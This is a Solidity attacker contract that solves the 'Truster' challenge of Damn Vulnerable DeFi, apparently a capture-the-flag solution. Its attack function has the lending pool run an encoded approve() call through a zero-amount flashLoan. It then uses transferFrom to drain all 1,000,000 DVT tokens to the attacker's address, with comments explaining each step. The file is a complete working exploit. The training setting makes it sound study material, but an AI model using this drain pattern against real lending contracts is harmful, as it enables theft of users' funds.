// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

 contract TrusterLenderPoolAttacker {
     
    using Address for address;

    address _attackerAddress;

    constructor (address attackerAddress) {
        _attackerAddress = attackerAddress;
    }

    function attack(address pool, address token) external {
        pool.functionCall(
            /**
             * First execute flashLoan() - there is no need to transfer any fund,
             * the purpose here is to let the pool executes approve() for the DVT in the pool
             */
            abi.encodeWithSignature(
                "flashLoan(uint256,address,address,bytes)",
                0,
                address(this),
                token,
                abi.encodeWithSignature( // executing the approve() function here
                    "approve(address,uint256)",
                    address(this),
                    1000000 ether)
            )
        );

        /**
         * Next step we drain the wallet by the use of our approval to move the fund inside the pool,
         * move all the DVT from the pool to our own address
         */
        token.functionCall(
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                pool,
                _attackerAddress,
                1000000 ether)
        );
    }
 }